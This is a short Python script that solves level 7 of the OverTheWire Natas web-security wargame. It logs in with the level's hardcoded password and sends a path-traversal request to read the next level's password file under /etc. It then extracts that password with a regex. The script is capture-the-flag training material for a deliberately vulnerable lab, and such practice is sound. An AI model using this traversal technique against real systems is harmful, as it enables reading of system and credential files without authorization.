import re
import requests
user = 'natas7'
password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'
url = 'http://{}.natas.labs.overthewire.org/index.php?page=../../../../../../etc/natas_webpass/natas8'.format(user)
r = requests.Session().get(url, auth=(user, password)).text
print(re.findall('<br>\n<br>\n(.*)', r)[0])